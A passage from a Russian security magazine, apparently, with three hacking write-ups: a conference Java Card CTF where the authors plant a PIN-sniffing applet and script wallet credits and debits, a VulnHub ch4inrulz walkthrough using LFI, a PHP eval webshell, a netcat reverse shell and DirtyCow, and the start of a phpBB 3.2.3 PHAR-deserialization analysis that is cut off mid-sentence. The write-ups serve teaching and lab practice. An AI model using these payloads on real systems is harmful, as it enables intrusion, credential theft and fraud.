в ответ на запрос хода их карты передавали желаемые направления переме‐
щения и стрельбы подконтрольного танка. Если ответ на запрос хода будет
некорректным, танк игрока не станет перемещать ся или стрелять.
 • AID: [0x4F,  0x46,  0x46,  0x5A,  0x4F,  0x4E,  0x45,  0x35,
  0x10, 0x01]
 • CLA: 0x80
 • INS:
    • 0x99: readySteady(check)
    • Параметры: BYTE check — целое число в диапазоне (0–100).
    • Ответ: BYTE check_response — целое число, равное check+1.
    • 0x66: getMap()
    • Параметры: BYTE[32] map — игровое поле в битовом представлении
      (сле ва направо и сверху вниз). Например, переданы значения [0xFF,
     0xFF, 0x80, 0x01, 0x93, 0x81, ...]. Тогда участок поля, описыва‐
     емый этими значениями, имеет следующий вид в битовом представ‐
      лении:


     1111111111111111
     1000000000000001
     1001001110000001
     ...

     1 означает неразрушимую и неп роходимую стену. 0 означает повер‐
      хность, по которой мож но перемещаться.
      • Ответ: BYTE[2] map_response — всегда равен 0x4f, 0x4b.
    • 0x33: getNextStep(step)
      • Параметры:
      • BYTE step — текущий игровой ход (200 → 0).
      • BYTE player_x — коор дината Х игрока (0 → 15).
      • BYTE player_y — коор дината Y игрока (0 → 15).
      • BYTE player_lives — число жизней игрока (3 → 0).
      • BYTE player_fuel — количес тво топ лива игрока (255 → 0).
      • BYTE player_rockets — число ракет игрока (255 → 0).
      • BYTE enemy_x — коор дината Х противника (0 → 15).
      • BYTE enemy_y — коор дината Y противника (0 → 15).
      • BYTE enemy_lives — число жизней про тивника (3 → 0).
      • BYTE enemy_fuel — количес тво топлива против ника (255 → 0).
      • BYTE enemy_rockets — число ракет противника (255 → 0).
      • BYTE bonus_count — число бонусов на карте на текущий ход (2 → 0).
      • BONUS[bonus_count] — список описаний бонусов (от 0 до 2 элемен‐
         тов, в зависимости от количества бонусов на карте).
      • BYTE bonus_x — координата Х бонуса (0 → 15).
      • BYTE bonus_y — коор дината Y бонуса (0 → 15).
      • BYTE bonus_type — тип бонуса (0 — бонус топлива, 1 — бонус
         ракет).
      • Ответ:
         • BYTE move_direction — направление перемещения игрока (0 —
           стоять на месте, 1 — двигаться вправо, 2 — дви гаться вверх, 3 —
          двигаться влево, 4 — двигать ся вниз).
         • BYTE  shoot_direction — направление выстрела игрока  (0 —
          не стре лять, 1 — стрелять вправо, 2 — стрелять вверх, 3 — стре‐
           лять вле во, 4 — стрелять вниз).

Код аппле та, который уже залит на вашу карту, можно пос мотреть по ссылке.
   Java‐карты конференции совместимы с GlobalPlatform, и для установки,
удаления и просмотра апплетов можно использовать GlobalPlatformPro. Нап‐
ример, чтобы получить список уста новленных апплетов, можно восполь‐
зоваться командой java ‐jar gp.jar ‐‐list ‐v.
  Задание (полное описание) заключалось в том, чтобы написать свой бот
для управления танком, используя предос тавля емый организаторами Smart‐
CardTanksBot.java как шаблон для постро ения бота.
Внутри шаблона есть строки, которые подтвердили предположение отно‐
сительно инструкции 0xA4.


if (buffer[ISO7816.OFFSET_INS] == 0xA4) return;

После разработки бота управления танком нужно было использовать пакет
GlobalPlatformPro, чтобы уста новить бот в системе. В описании задания ука‐
зано, что апплеты можно не только уста навливать, но и просматривать уже
установленные, а также удалять их.
  Был получен список апплетов, установленных в системе.





Проанализировав список, можно выделить, что здесь пред ставлены AID
для всех пяти задач на карте, а также некий секретный апплет, который имеет
AID:


SECRET = [0xA0, 0x00, 0x00, 0x00, 0x50, 0x10, 0x10, 0x50, 0x10, 0x01]

Судя по используемому AID и его похожести на родительский апплет, он, ско‐
рее всего, управляющий. Еще интерес ная осо бенность, что он име ет класс
инструкций = 0x80, отличный от других, и в то же время такой же класс был
у задачи с танками.


Иссле дование команд управляющего аппле та
В управляющем апплете были найдены команды:


SECRET_Cmds = [(0x20,0x63,0x00),(0x30,0x63,0x01),(0x40,0x63,0x01), (
0x50,0x67,0x00),(0x60,0x63,0x01),(0x70,0x63,0x01),(0x80,0x67,0x00), (
0x90,0x63,0x01),(0xA0,0x67,0x00),(0xA4,0x90,0x00)]

Поскольку для некото рых команд код ошиб ки sw1, sw2 = 0x67, 0x00, что
означает «неверная длина данных», был выполнен перебор по этому полю.
  Выяснилось, что во всех трех командах размер данных должен быть равен
нулю. Также с помощью сравнения результатов работы этих команд для раз‐
ных карточек было определено их предназна чение.


По луче ние балан са
Ins = 0x50 — получение текущего баланса на карте.
  Код для реализации команды прос той.


BalanceIns = [0x80, 0x50, 0x00, 0x00, 0x00]
def GetBalance():
  data, sw1, sw2 = connection.transmit(SELECT_SECRET)
  print("Select Secret Applet: 0x%02X 0x%02X" % (sw1, sw2))
  data, sw1, sw2 = connection.transmit(BalanceIns)
  print("‐‐‐‐‐ Current Balance: %02u %02u" % (data[0], data[1]))





                        Результат работы


По луче ние статуса выпол нения задач на карте
Ins = 0x80 — получение сос тояния задач на карте, решена или нет.
  Код реализации такой:


TaskStateIns = [0x80, 0x80, 0x00, 0x00, 0x00]
def GetTaskState():
  data, sw1, sw2 = connection.transmit(SELECT_SECRET)
  print("Select Secret Applet: 0x%02X 0x%02X" % (sw1, sw2))
  data, sw1, sw2 = connection.transmit(TaskStateIns)
  print("Current Task State:")
  print(data)





                        Результат работы

Как видим, решены первые четыре задачи из рас положенных на карте.


По луче ние статуса выпол нения логических задач
Ins = 0xA0 — получение некото рого сос тояния, как выяснилось поз же —
состояния решения логических задач в зоне BI.ZONE. Скрипт для вывода этой
информации:


SomeLenIns = [0x80, 0xA0, 0x00, 0x00, 0x00]
def GetSomeState():
  data, sw1, sw2 = connection.transmit(SELECT_SECRET)
  print("Select Secret Applet: 0x%02X 0x%02X" % (sw1, sw2))
  data, sw1, sw2 = connection.transmit(SomeLenIns)
  print("Current Some State:")
  print(data)





                        Результат работы

Всего задач девять. На данной карте ни одна из задач этого типа еще не
решена.
  Получается, что этот управляющий апплет отвечает за взаимодействие
с банкоматом. По наблюдениям было замечено, что после решения задачи
на карточке состояние задачи в управляющем апплете не менялось. Это зна‐
чит, что банкомат считывал состояние, решена задача или нет, из апплета
самой задачи, а затем устанавливал сам флаг и начислял деньги за решение
задачи.
   Итак, к этому моменту мы уже могли получать баланс карточки и состояние
задач двух типов. И оста лось нес колько команд с неизвес тным пред назна‐
чением.


SECRET_UNK_Cmds = [(0x20,0x63,0x00), (0x30,0x63,0x01), (0x40,0x63,
0x01), (0x60,0x63,0x01), (0x70,0x63,0x01), (0x90,0x63,0x01)]

Коды ошибок отличаются только у одной команды. Было сделано пред‐
положение, что эта команда 0x20 отвечает за некоторую авторизацию,
а остальные за какие‐то действия. Сами коды ошибок, начинающиеся
с 0x63 в справочнике, обоз начали варианты State of non‐volatile memo‐
ry changed, что в данном контексте неин формативно.
  Выяснилось, что управляющий апплет пос троен на базе типового Wallet‐
апплета. Описание и исходники типового Wallet можно найти в поисковике
по фразе java card wallet.
  Первое, что бросается в глаза в исходнике, — это знакомые коды ошибок


// signal that the PIN verification failed
final static short SW_VERIFICATION_FAILED = 0x6300;
// signal the the PIN validation is required
// for a credit or a debit transaction
final static short SW_PIN_VERIFICATION_REQUIRED = 0x6301;

Затем видим такой же класс 0x80 и коды типовых инструкций. Получение
баланса сов падает с кодом, уже найденным нами. Предположение оказалось
верным: 0x20 — команда верификации.


// code of CLA byte in the command APDU header
final static byte Wallet_CLA = (byte)0x80;
// codes of INS byte in the command APDU header
final static byte VERIFY = (byte) 0x20;
final static byte CREDIT = (byte) 0x30;
final static byte DEBIT = (byte) 0x40;
final static byte GET_BALANCE = (byte) 0x50;

Чтобы самостоятельно снимать и начислять деньги на карту, осталось найти
правильный PIN, назовем его SystemPIN.
  Сначала мы решили попробовать получить SystemPIN с помощью аппарат‐
ного перехватчика, но по техничес ким при чинам это не получилось. Благода‐
рим организаторов — они подготовили специальный стенд, чтобы мы
не экспериментировали на боевой системе.
  Мы обратили внимание на следующее. Мы могли удалять и устанавливать
любой апплет. Класс 0x80 совпадал у управляющего апплета и бота управле‐
ния танчиками — думаю, в этом был некий намек от организаторов.
  Возникла идея заменить управляющий апплет на свой, который будет
только считывать PIN, сохранять его в памяти карты и возвращать его нам
по запросу.
  За основу был взят исходный код бота для танков SmartCardTanksBot.
java. В него мы добавили строки для сохранения у себя в памяти всего
пакета передачи PIN. PIN передается, когда вставляешь карту в терминал.


final static byte VERIFY = (byte) 0x20;
private void verify(APDU apdu) {
    byte[] buffer = apdu.getBuffer();
    byte byteRead = (byte)(apdu.setIncomingAndReceive());
    sniffedPIN[0] = byteRead;
    sniffedPIN[1] = (byte)buffer.length;
    for(short i = 0; i < buffer.length; i++)
        sniffedPIN[i + 2] = buffer[i]
}

Также реализовали выдачу перехваченного пакета с PIN по нашему запросу.


final static byte GET_PIN = (byte) 0x77;
private void getPin(APDU apdu) {
    byte[] buffer = apdu.getBuffer();
    short le = apdu.setOutgoing();
    apdu.setOutgoingLength((short)128);
    for(short i = 0; i < 128; i++)
    {
        buffer[i] = sniffedPIN[i+1];
    }
    apdu.sendBytes((short)0, (short)128);
}

Чтобы новая команда GET_PIN зарабо тала, в обра ботчик инструкций добави‐
ли:


public void process(APDU apdu) {
         byte[] buffer = apdu.getBuffer();
         if (buffer[ISO7816.OFFSET_INS] == (byte)(0xA4)) {
             return;
         } else if (buffer[ISO7816.OFFSET_CLA] != APPLET_CLA) {
             ISOException.throwIt(ISO7816.SW_CLA_NOT_SUPPORTED);
         }
           switch (buffer[ISO7816.OFFSET_INS]) {
             case MOVE:
                 sendMove(apdu);
                 return;
             case MAP:
                 getMap(apdu);
                 return;
             case TEST:
                 test(apdu);
                 return;
             case VERIFY:
                 verify(apdu);
                 return;
             case GET_PIN:
                 getPin(apdu);
                 break;
             default:
                 ISOException.throwIt(ISO7816.SW_INS_NOT_SUPPORTED);
     }
 }

Далее скомпилировали через JCIDE с нуж ным нам номером AID. Управля‐
ющий апплет, отвечающий за проверку PIN, был удален.





Затем вместо него был уста новлен апплет, подготовленный нами.





После этого карта уже не могла использовать ся для конкурсов, начисления
и снятия OFFCOIN, пос кольку мы удалили оригинальный управляющий
апплет. После нескольких испорченных таким обра зом карт нам удалось
получить PIN. С помощью следующего скрипта получили с этой карты содер‐
жимое пакета, где был PIN:


GET_SYSTEM_PIN = [0x80, 0x77, 0x00, 0x00]
def GetSystemPIN():
    data, sw1, sw2 = connection.transmit(SELECT_SECRET)
    print("Select Secret Applet: 0x%02X 0x%02X" % (sw1, sw2))
    data, sw1, sw2 = connection.transmit(GET_SYSTEM_PIN)
    print("Get System PIN Packet State: 0x%02X 0x%02X" % (sw1, sw2))
    print(data)

На выходе получили следующее.





Здесь первые 4 байта — это заголо вок зап роса авторизации. Затем идет
длина данных — 8 байт. Пос ледующие 8 байт — зна чение PIN.


SystemPIN = [0xDB, 0X4D, 0XDE, 0X11, 0X6A, 0X27, 0X5B, 0X85]

На этом этапе нас объявили победителями конкурса.


Зачисление и снятие OFFCOIN
По пути в аэро порт мы попробовали реализовать верификацию, операции
зачисления на карту и сня тие с карты OFFCOIN. Опыт ным путем выявлено, что
перед каждой операцией нужно проводить верификацию. Процеду ра, выпол‐
няющая это, име ет вид:


AuthIns = [0x80, 0x20, 0x00, 0x00] + [len(SystemPIN)] + SystemPIN
def GetAuth():
    data, sw1, sw2 = connection.transmit(SELECT_SECRET)
    data, sw1, sw2 = connection.transmit(AuthIns)

Например, зачисление 250 OFFCOIN на карту выполняется следующим
кодом:


CreditIns = [0x80, 0x30, 0x00, 0x00] + [2] + [0x00, 0xFA]
def MakeCredit():
    data, sw1, sw2 = connection.transmit(SELECT_SECRET)
    print("Select Secret Applet: 0x%02X 0x%02X" % (sw1, sw2))
    GetAuth()
    print(CreditIns)
    data, sw1, sw2 = connection.transmit(CreditIns)
    print("Credit Instruction State: 0x%02X 0x%02X" % (sw1, sw2))





            Результат работы скрипта зачисления OFFCOIN

Снятие 100 OFFCOIN с карты выполняет ся следующим кодом:


DebitIns = [0x80, 0x40, 0x00, 0x00] + [2] + [0x00, 0x64]
def MakeDebit():
    data, sw1, sw2 = connection.transmit(SELECT_SECRET)
    print("Select Secret Applet: 0x%02X 0x%02X" % (sw1, sw2))
    GetAuth()
    print(DebitIns)
    data, sw1, sw2 = connection.transmit(DebitIns)
    print("Debit Instruction State: 0x%02X 0x%02X" % (sw1, sw2))





              Результат работы скрипта снятия OFFCOIN

Опытным путем было установлено, что предел для карт с конференции —
5632 OFFCOIN.


ЗАКЛЮЧЕНИЕ
Благодарим организаторов за прекрасный, интерес ный и увлекательный кон‐
курс. Решение его задач доставило мно го радости и веселья!
ВЗЛОМ
  ЦЕПНАЯ
      РЕАКЦИЯ

             РАЗБИРАЕМ УЯЗВИМОСТЬ
           ОТ ЗАБЫТОГО КОММЕНТАРИЯ
         ДО ПОЛНОЙ КОМПРОМЕТАЦИИ





  Андрей Скуратов                      Сергей Мигалин                    Михаил Фирстов
 skuratov1997@mail.ru                         smigalin@authors.glc.ru                Работаю пентестером в FBK Cy‐
                                                                                                  bersecurity. Специализируюсь
                                                                                   на услугах в области
                                                                                 практической информационной
                                                                                          безопасности.
                                                                                   cyberpunkyc@gmail.com





В этой статье нам предстоит преодо леть длинную цепочку
препятствий на пути к заветному руту. По дороге мы в разных
вариантах обнаружим уязвимости типа LFI, RCE и эскалации
привилегий. А упражняться будем на виртуальной машине
ch4inrulz: 1.0.1, полученной с VulhHub.


             INFO

                       VulnHub — ресурс, предоставляющий образы опе‐
                      рационных  систем  с  сервисами,  в  которых
                       «зашиты» уязвимости. Скачав такой образ, любой
                      желающий может получить опыт взлома или сис‐
                      темного администрирования.
                          Также читай наш предыдущий отчет — о взломе
                      виртуальной машины Wakanda: 1.



СКАНИРОВАНИЕ ПОРТОВ
Итак, мы скачали и разверну ли виртуальную машину. Начнем с классики: ска‐
нируем ее при помощи Nmap. Для этого выполним такую команду (если
захочешь повторить, IP будет другим):


$ nmap ‐Pn ‐A 192.168.56.101





Обнаруживаем, что у тачки торчат порты 21/22, то есть FTP и SSH, а так‐
же 80 и 8011 — с веб‐сервером.
  Можно, конечно, первым делом ринуться на FTP, но делать этого мы
не будем, а вместо это го постучимся на веб‐сервер и проведем небольшую
разведку. На 80‐м пор те видим сайт некоего Франка, но никакого интерес‐
ного интерактива на нем нет.





На 8011‐м порте видим заманчивое сооб щение, но больше ничего полезного
на странице не нашлось.





ФАЗЗИНГ ДИРЕКТОРИЙ
Пришло время фаззинга директорий! Делается он для того, чтобы обна‐
ружить какие‐то стандартные или интересные пути, где могут быть забыты
важные файлы или сервисы, которые нам могут помочь в дальнейшей работе.
  Первым мы исследовали 80‐й порт, где обна ружился путь /development.





Тут нас встречает basic authentication — пробуем HTTP Verb Tampering,
но безуспешно.


             INFO

                     HTTP Verb Tampering — ата ка, которая использует
                         уязвимость     в     HTTP‐Verb‐аутентифика ции
                      и механизмах контроля доступа. Многие механиз‐
                  мы аутентификации только ограничивают доступ
                      по своим параметрам, не предусматривая несан‐
                       кционирован ный доступ  к зак рытым ресурсам
                        с помощью других методов.





Можно начать брутить, но прежде пос мотрим, что нам даст фаззинг на 8011‐
м порте.





Интересно! Кажется, мы нашли API какого‐то приложения. Срочно лезем
смотреть!





LOCAL FILE INCLUSION
Из перечисленных файлов в живых остался толь ко files_api.php.





Окей, для работы скрип та требуется параметр file. Давай передадим его.





Кажется, нас спалили! Попытка перебо ра стандартных фай лов и проверка
на напрашивающийся LFI не сра ботали через запросы GET. На данном этапе
эта точка наиболее интерес на, так что давай попробуем поиграться с ней,
а не копать дальше. Первая мысль, что пришла в голову: а что, если поп‐
робовать POST?





Успех! Нам даже не пришлось замора чиваться с врапперами, null‐байтами
и прочими ухищрениями для тестирования воз можнос ти эксплуатации уяз‐
вимостей типа LFI, которую мы заподоз рили ранее.
   Теперь хотелось бы посмотреть на исходни ки веб‐приложений. Для этого
придется немного помучиться с уга дыванием путей, что в итоге приведет нас
к следующему.





Для поиска путей можно использовать разные словари, однако нам хватило
и ручного перебора по стандартным вебовым путям из головы. :)
  Отлично, теперь мы знаем, что корневая папка веба — /var/www. Попытка
проверить  содержание  конфигура ционных файлов  в  этой  директории
не увенчалась успехом, но мы зна ем про пап ку /development. А там нас ждет
очередная удача.





Теперь заглянем в /etc/.htpasswd.





А вот, кажется, и креды от basic  authentication. Осталось сломать хеш
от пароля.
  Воспользуемся для это го утилитой hashcat и словари ком rockyou.


$ hashcat ‐a 0 ‐m 1600 hash Downloads/rockyou.txt

Здесь
 • a 0 — тип атаки по сло варю;
 • m 1600 — номер типа хеша. В нашем случае — Apache $apr1$ MD5,
  md5apr1, MD5 (APR). Узнать этот номер мож но здесь;
 • hash — файлик с хешем $apr1$1oIGDEDK$/aVFPluYt56UvslZMBDoC0;
 • Downloads/rockyou.txt — путь до словаря.

В результате получаем пароль!





Кстати, потом обнаружилось, что хеш можно было получить, выкачав дос‐
тупный index.html.bak на 80‐м порте, но было уже поздно. :)
  Мы же бежим смотреть, что находится за basic authentication с кредами
frank:frank!!!. Там нас встречает следующая страница.





Опять никаких ссылок, и нам снова приходится мучиться с угадыванием пути,
но тут все тривиально.





Мы нашли сервис для загрузки картинок. Заманчиво, но давай сначала взгля‐
нем на исходники. Как ты помнишь, мы уже можем это сделать. Но без врап‐
перов тут уже не обой тись.





Раскрываем это в читабельном виде.





Получили сле дующий исходник.


<?php
$target_dir = "FRANKuploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"
]);
$uploadOk = 1;
$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION
));
// Check if image file is a actual image or fake image
if(isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if($check !== false) {
        echo "File is an image ‐ " . $check["mime"] . ".";
        $uploadOk = 1;
    } else {
        echo "File is not an image.";
        $uploadOk = 0;
    }
}
// Check if file already exists
if (file_exists($target_file)) {
    echo "Sorry, file already exists.";
    $uploadOk = 0;
}
// Check file size
if ($_FILES["fileToUpload"]["size"] > 500000) {
    echo "Sorry, your file is too large.";
    $uploadOk = 0;
}
// Allow certain file formats
if($imageFileType != "jpg" && $imageFileType != "png" && $imageF
ileType != "jpeg"
&& $imageFileType != "gif" ) {
    echo "Sorry, only JPG, JPEG, PNG & GIF files are allowed.";
    $uploadOk = 0;
}
// Check if $uploadOk is set to 0 by an error
if ($uploadOk == 0) {
    echo "Sorry, your file was not uploaded.";
// if everything is ok, try to upload file
} else {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"],
$target_file)) {
        echo "The file ". basename( $_FILES["fileToUpload"]["name"]).
 " has been uploaded to my uploads path.";
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
}
?>

Первая идея — впихнуть в метаданные картинки код на PHP, который мы
потом сможем исполнить благода ря обнаруженной ранее LFI.
  Осталось подготовить пейлоад. Для это го берем любую картинку в JPG и с
помощью exiftool положим в comment нужный нам код при помощи вот такой
команды:


$ exiftool ‐comment="<?php eval(\$_POST[0]); ?>" payload1.jpg





Теперь идем загружать!





Отлично, но где сам файл? Самые наблюдательные могли увидеть его в сор‐
цах, которые мы вытащили ранее.





Пора инклудить!





Ура!


ПОЛУЧАЕМ RCE
Теперь формируем запрос на проброс реверс‐шелла. Если подробнее, то
URL‐энкодим вот такой пейлоад:


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh ‐i 2>&1|nc 10.0.0.1 1234 >
/tmp/f

Затем отправляем его в функции urldecode и system. Кстати, раз ные полез‐
ные нагрузки ты можешь позаимство вать здесь.





В результате ловим сессию.





ЭСКАЛАЦИЯ ПРИВИЛЕГИЙ
Проверим, что за система кру тится на тачке.




Нам несказанно повезло, ведь мы можем получить рут при помощи экс плоита
для уязвимости DirtyCow. Находим его в ExploitDB и, следуя инструкции,
исполняем.





Тачка наша, расходимся!


КРАТКО О ГЛАВНОМ
На машине мы обнаружили торчащие наружу FTP (который в нашем решении
не пригодился), SSH и два веб‐приложения. Благода ря LFI в одном из них мы
разжились кредами для basic authentication, где нашел ся сервис для аплоада
картинок. Загрузив вредонос ную картинку, мы получи ли RCE, проинклудив ее
через LFI. Далее мы завладели пра вами рута при помощи эксплоита DirtyCow.
Вот и все! При желании можешь ска чать вир туалку и попробовать проделать
все то же, не подглядывая сюда. :‐)
ВЗЛОМ


  СТАРЫЙ САРАЙ,
  НОВЫЕ ГРАБЛИ

                ЭКСПЛУАТИРУЕМ PHAR‐
                  ДЕСЕРИАЛИЗАЦИЮ
                          В PHPBB





                                                                                       aLLy
                                                                                   ONsec
                                                                                                @iamsecurity





В знаменитом форумном движке phpBB обнаружилась уяз‐
вимость, связанная с PHP‐десериализацией. В результате
некорректной проверки настроек ата кующий может сох‐
ранить файл с произвольным содержимым на целевой сис‐
теме и таким образом получить выполнение произвольных
команд и скомпрометировать сервер. Здесь я детально раз‐
беру каждый аспект обнаружен ной проблемы и покажу спо‐
соб ее эксплуатации.


             INFO

                       Уязвимость связана с техникой PHAR‐десериали‐
                        зации, которую мы недавно освещали. Баг акту‐
                       ален для phpBB версии 3.2.3.


Думаю,  что phpBB в представлении не нуждает ся. Он существует аж
с 16 декабря 2000 года. Поднимем бокалы за его совершеннолетие! За это
время движок повидал множество уяз вимос тей самого разного рода. Одна
из самых известных — CVE‐2004‐1315, или в миру viewtopic highlight PHP injec‐
tion. Этот баг был одним из первых, который я изучил.
  Впрочем, вернемся к современным реалиям. Сей час phpBB, конечно,
растерял былую популярность, но все еще огромное количество площадок
выбирает его как основную плат форму общения поль зователей.
   Уязвимость нашел исследова тель из RIPS Technologies, воспользовав‐
шись сканером исходных кодов производства сво ей компании. Можно даже
заценить его отчет.


СТЕНД
Начнем с привычного — поднятия среды для тес тирования уязвимости.
Форум работает со мно гими базами данных, но я буду использовать старый
добрый MySQL в виде контейнера Docker. Рекомендую использовать версии
из ветки 5.х, так как в пос ледних бранчах (8.х) изменился протокол авториза‐
ции по умолчанию и клиент ские биб лиотеки текущих репози ториев PHP
не работают с ним. Такое поведение можно поменять в конфигурационном
файле MySQL, но зачем лиш ние телодвижения для тес тового стенда, верно?


$ docker run ‐e MYSQL_USER="phpbb" ‐e MYSQL_PASSWORD="JaLdqX5on0" ‐e
MYSQL_DATABASE="phpbb" ‐d ‐‐rm ‐‐name=mysql ‐‐hostname=mysql mysql/
mysql‐server:5.7

Теперь можно приступать к разворачиванию самого сервера. По традиции
использую Debian.


$ docker run ‐‐rm ‐p80:80 ‐ti ‐‐name=phpbb ‐‐hostname=phpbb ‐‐link=
mysql debian /bin/bash

Обновляем репозитории и ста вим нуж ные пакеты.


$ apt update && apt install ‐y zip wget nano apache2 php php‐mysql
php‐xml php‐mbstring php‐gd

Скачиваем архив с уязвимой версией форума phpBB (3.2.3) и распаковы ваем
его.


$ cd /var/www/html
$ wget https://www.phpbb.com/files/release/phpBB‐3.2.3.zip
$ unzip phpBB‐3.2.3.zip
$ chown www‐data:root ‐R phpBB3

Если хочется побаловаться с отладкой, то дополнительно ставим xdebug.


$ apt install ‐y php‐xdebug

Настраиваем модуль и включаем его. Не забывай изменить IP под свои
реалии.


$ echo "xdebug.remote_enable=1" >> /etc/php/7.0/mods‐available/
xdebug.ini
$ echo "xdebug.remote_host=192.168.99.1" >> /etc/php/7.0/mods‐availa
ble/xdebug.ini
$ phpenmod xdebug

Далее правим конфиги веб‐сервера и запускаем его.


$ sed 's/html/html\/phpBB3/' ‐i /etc/apache2/sites‐enabled/
000‐default.conf
$ service apache2 start

Теперь переходим в браузере по адресу контейнера и устанавливаем и нас‐
траиваем форум.





                      Ус тановка форума phpBB

После завершения инсталляции не забудь снес ти папку install.


$ rm ‐rf /var/www/html/phpBB3/install

Стенд готов.


ЧАСТЬ ПЕРВАЯ: ВНЕДРЯЕМ ВРАППЕР PHAR
Начнем с просмотра исходников. Если ты внимательно изучал мою прошлую
статью про PHAR‐десериализацию, то зна ешь, на вызовы каких функций сто‐
ит обратить особое внимание при поиске потенциально уязвимых мест. Кон‐
кретно в этом случае нужно поискать file_exists. Код phpBB объ емный
(~300 тысяч строк), и вызовов этой функции там предостаточно. Но нас инте‐
ресуют только те, которым в качес тве аргумента можно пропихнуть юзердату.
Не буду тянуть и скажу, что интересу ющий нас вызов находится в файле func‐
tions_acp.php.


/phpBB3.2.3/includes/functions_acp.php
420: function validate_config_vars($config_vars, &$cfg_array, &$error
)
421: {
...
428:    foreach ($config_vars as $config_name => $config_definition)
429:    {
...
443:        switch ($validator[$type])
444:        {
...
544:            case 'rpath':
545:            case 'rwpath':
...
568:            case 'absolute_path':
569:            case 'absolute_path_writable':
570:            // Path being relative (still prefixed by phpbb_
root_path), but with the ability to escape the root dir...
571:            case 'path':
572:            case 'wpath':
...
588:                $path = in_array($config_definition['validate'],
array('wpath', 'path', 'rpath', 'rwpath')) ? $phpbb_root_path . $
cfg_array[$config_name] : $cfg_array[$config_name];
589:
590:                if (!file_exists($path))
591:                {
592:                    $error[] = sprintf($user‐>lang['DIRECT
ORY_DOES_NOT_EXIST'], $cfg_array[$config_name]);
593:                }
594:
595:                if (file_exists($path) && !is_dir($path))
596:                {
597:                    $error[] = sprintf($user‐>lang['DIRECT
ORY_NOT_DIR'], $cfg_array[$config_name]);
598:                }
599:
600:                // Check if the path is writable
601:                if ($config_definition['validate'] == 'wpath' ||
$config_definition['validate'] == 'rwpath' || $config_definition['
validate'] === 'absolute_path_writable')
602:                {
603:                    if (file_exists($path) && !$phpbb_filesystem
‐>is_writable($path))
604:                    {
605:                        $error[] = sprintf($user‐>lang['DIRECT
ORY_NOT_WRITABLE'], $cfg_array[$config_name]);
606:                    }
607:                }

Из названия файла мож но понять, что функция валидации конфигурационных
переменных  (validate_config_vars) заходит в нужную нам ветку, когда
выпол няется проверка путей в панели админис тра тора (в терминологии ph‐
pBB ACP — Administrator Control Panel).
  Проверим это. Откроем админку и найдем любой раздел, где можно ука‐
зать путь.





                Раздел нас троек прикрепляемых файлов

Как видишь, я открыл нас тройки прикреплен ных файлов. Там есть опция Up‐
load directory — папка, в которую они будут загружаться. Теперь поставим
бряк где‐нибудь в начале тела case и наж мем Submit.





             Отладки функции validate_conﬁg_vars в phpBB

Брейк‐пойнт сработал, так как валидатором переменной upload_path служит
wpath.


/phpBB3.2.3/includes/acp/acp_attachments.php
138:                $display_vars = array(
...
150:                        'upload_path'           => array('lang'
=> 'UPLOAD_DIR',            'validate' => 'wpath',  'type' => 'text:
25:100', 'explain' => true),

Никаких дополнительных проверок переменной $path не производится,
и указанное пользователем зна чение попадает в качес тве аргу мента в фун‐
кцию file_exists.





        Передача пользовательских данных в функцию ﬁle_exists

Обрати внимание на добавленный префикс ./../. Он появляется, потому что
мы имеем дело с настройкой, которая подразумевает относительные пути.
Но для выполнения атаки нам нужен полный контроль над всей переменной,
поскольку требуется передать зна чение, начина ющееся с враппера phar://.
Для этих целей отлично подойдут те нас трой ки, у которых есть валидатор ab‐
solute_path.
  Одна из таких — это img_imagick. Путь до бинарника утилиты Image‐
Magick для манипуляции с загруженными изображениями. Находится она там
же, в разделе настрой ки аттачей.


/phpBB3.2.3/includes/acp/acp_attachments.php
138:                $display_vars = array(
...
167:                        'img_imagick'               => array('
lang' => 'IMAGICK_PATH',          'validate' => 'absolute_path',  '
type' => 'text:20:200', 'explain' => true, 'append' => '  <span>[ <a
href="' . $this‐>u_action . '&action=imgmagick">' . $user‐>lang['
SEARCH_IMAGICK'] . '</a> ]</span>'),





      Использование враппера phar в качестве пути к ImageMagick

Вот теперь получается нас тоящее внед рение, и первая часть атаки успешно
выпол нена.





         Внедрение враппера phar в аргу мент функции ﬁle_exists




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
     СТАРЫЙ САРАЙ,
     НОВЫЕ ГРАБЛИ
           ЭКСПЛУАТИРУЕМ PHAR‐ДЕСЕРИАЛИЗАЦИЮ
                                   В PHPBB





ЧАСТЬ ВТОРАЯ: ПЕРЕДАЕМ АРХИВ PHAR
Теперь нам нужно каким‐то образом передать файл на сервер. И не прос то
файл, а валидный архив PHAR. К счастью, phpBB — это продвинутая борда
и здесь можно обменивать ся файлами, прикреплять их к пос там и, если такая
настройка включена, отправлять в личных сооб щениях. По умолчанию раз‐
решается делать толь ко первое.





       Прикрепле ние файлов к сообщениям в теме форума phpBB

И это очень хорошо, потому что дефолтные нас трой ки поз воляют тебе заг‐
ружать произвольные файлы с разрешением, например, tar без всякой
валидации.





        Стандартные допустимые расширения для загрузки аттачей

А главное, что нам требуется для успешной ата ки, — это локальный файл
с любым расширением, содержащий корректный архив PHAR. Но вот незада‐
ча: после загрузки файл переименовывается и помещается в директорию
files, и новое имя совсем не раду ет — оно не имеет рас ширения. И даже
если бы и имело, угадать новое наз вание не представляется возможным.
Узнать можно только префикс — это ID пользователя и символ _, а остальная
часть — это чистый рандом.





            phpBB переименовывает аттач пос ле загрузки


/phpBB3.2.3/phpbb/attachment/upload.php
014: namespace phpbb\attachment;
...
057:     /** @var \phpbb\files\filespec Current filespec instance */
058:     private $file;
...
028: class upload
029: {
...
109:    public function upload($form_name, $forum_id, $local = false,
 $local_storage = '', $is_message = false, $local_filedata = array())
110:    {
...
153:        $this‐>file‐>clean_filename('unique', $this‐>user‐>data['
user_id'] . '_');


/phpBB3.2.3/phpbb/files/filespec.php
014: namespace phpbb\files;
...
022: class filespec
023: {
...
205:    public function clean_filename($mode = 'unique', $prefix = ''
, $user_id = '')
206:    {
...
212:        switch ($mode)
213:        {
...
230:            case 'unique':
231:                $this‐>realname = $prefix . md5(unique_id());
232:            break;

Все нужные для последующей работы с файлом данные заносятся в базу дан‐
ных.





   Информация о прикрепленном файле хра нится в таблице attachments

Однако стоит посмотреть на сам интерфейс для загрузки файлов. В phpBB
используется библиотека plupload, которая помимо прочего позволя ет гру‐
